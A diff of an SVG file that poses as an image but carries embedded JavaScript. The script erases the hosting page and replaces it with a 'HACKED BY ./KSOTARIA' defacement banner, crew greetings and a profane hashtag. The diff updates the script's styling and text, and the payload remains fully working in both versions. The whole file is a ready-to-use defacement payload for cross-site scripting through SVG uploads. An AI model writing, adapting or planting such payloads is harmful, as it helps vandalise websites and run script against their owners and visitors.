@@ -1,31 +1,22 @@
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-   <polygon id="triangle" points="0,0 0,50 50,0" fill="#ff0000" />
-   
+   <rect width="100%" height="100%" fill="black" />
    <script type="text/javascript">
       <![CDATA[
-         // Menghapus seluruh isi halaman asli
          document.documentElement.innerHTML = "";
-         
-         // Injeksi CSS dan HTML Deface Ksotaria
          document.body.style.backgroundColor = "#000";
-         document.body.style.color = "#ff0000";
-         document.body.style.fontFamily = "Courier New, monospace";
-         document.body.style.textAlign = "center";
-         document.body.style.paddingTop = "20%";
-         
          document.body.innerHTML = `
-            <h1 style="font-size: 50px; text-shadow: 0 0 10px #ff0000;">HACKED BY KSOTARIA</h1>
-            <p style="color: #fff; letter-spacing: 5px;">YOUR SECURITY IS AN ILLUSION</p>
-            <div style="border: 1px solid #ff0000; display: inline-block; padding: 20px; margin-top: 20px;">
-               [+] Greetz: my self & All Cyber Warriors [+]
+            <div style="color:#ff0000; font-family:'Courier New',monospace; text-align:center; padding-top:20%;">
+               <h1 style="font-size: 50px; text-shadow: 0 0 10px #ff0000;">HACKED BY ./KSOTARIA</h1>
+               <p style="color: #fff; letter-spacing: 5px;">YOUR SECURITY IS AN ILLUSION</p>
+               <div style="border: 1px solid #ff0000; display: inline-block; padding: 20px; margin-top: 20px;">
+                  [+] Greetz: k4puyu4k - halisia - temo - wsl'users [+]
+               </div>
+               <p style="color: #444; margin-top: 30px;">#FuckYou_Mafia</p>
             </div>
          `;
-         
-         // Menambahkan efek title pada browser
          document.title = "Hacked By Ksotaria";
       ]]>
    </script>
 </svg>
-
